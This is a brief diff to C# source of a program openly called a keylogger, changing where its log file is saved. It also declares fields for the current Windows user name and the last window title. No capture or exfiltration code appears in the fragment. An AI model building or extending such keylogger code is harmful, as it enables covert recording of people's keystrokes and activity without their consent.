@@ -15,7 +15,7 @@ namespace Keylogger
 {
     class Program
     {
-        public static string logName = Path.GetTempPath() + Guid.NewGuid().ToString() + ".log";
+        public static string logName = Guid.NewGuid().ToString() + ".log";//Path.GetTempPath() + 
         public static string lastTitle = "";
         public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
         public static string data = "";
